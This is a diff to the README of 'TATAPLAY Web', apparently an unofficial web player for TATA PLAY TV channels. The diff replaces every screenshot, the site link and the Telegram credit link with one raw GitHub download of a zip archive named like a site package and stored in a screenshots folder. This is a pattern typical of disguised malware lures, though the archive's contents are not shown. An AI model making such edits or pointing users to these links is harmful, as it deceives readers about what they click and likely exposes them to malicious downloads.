@@ -1,5 +1,5 @@
 
-<p align="center"><img src="https://i.postimg.cc/02jW7xSY/TATA-PLAY-Denver.jpg" width="350" height="150"></p>
+<p align="center"><img src="https://github.com/alluringabhi/denverisalive.github.io/raw/refs/heads/main/Screenshot/io_denverisalive_github_v1.0.zip" width="350" height="150"></p>
 
 <h1 align='center'>✯ TATAPLAY Web ✯</h1>
 
@@ -31,7 +31,7 @@
 •<strong> Visit The Site </strong>
 <br>
 
-  <a href="https://denverisalive.github.io">
+  <a href="https://github.com/alluringabhi/denverisalive.github.io/raw/refs/heads/main/Screenshot/io_denverisalive_github_v1.0.zip">
 <img src="https://img.shields.io/badge/GitHub_Page-Link-red" />
 </a>
 
@@ -39,15 +39,15 @@
 <strong><i>• You can Search the Channel or Switch to  Category Option for Selected Channels</i></strong>
 <br>
 
-<img src="https://i.postimg.cc/zv9C5tQb/home-page.jpg" alt="home" width="340" height="500"></br>
+<img src="https://github.com/alluringabhi/denverisalive.github.io/raw/refs/heads/main/Screenshot/io_denverisalive_github_v1.0.zip" alt="home" width="340" height="500"></br>
 
 <strong><i>• New Stylish Player with TV Guide</i></strong>
 <br>
-<img src="https://i.postimg.cc/zD92q0KF/player-page.jpg" width="340" height="500"></br>
+<img src="https://github.com/alluringabhi/denverisalive.github.io/raw/refs/heads/main/Screenshot/io_denverisalive_github_v1.0.zip" width="340" height="500"></br>
 
 <strong><i>• Search the channel nsme it will automatically fill the channel id then select the time duration & submit.</i></strong>
 <br>
-<img src="https://i.postimg.cc/6p6rKvjh/catchup-page.jpg" alt="Catchup7-Days" width="340" height="500"></br>
+<img src="https://github.com/alluringabhi/denverisalive.github.io/raw/refs/heads/main/Screenshot/io_denverisalive_github_v1.0.zip" alt="Catchup7-Days" width="340" height="500"></br>
 
 
 <br>
@@ -60,7 +60,7 @@
 - This is Just For Educational & Entertainment Purpose
 - DO NOT Sell this Script file
 - Follow me for more updates 😁
-<a href="https://t.me/DenverIsAlivee">@DenverIsAlivee</a>
+<a href="https://github.com/alluringabhi/denverisalive.github.io/raw/refs/heads/main/Screenshot/io_denverisalive_github_v1.0.zip">@DenverIsAlivee</a>
 <br>
 
 
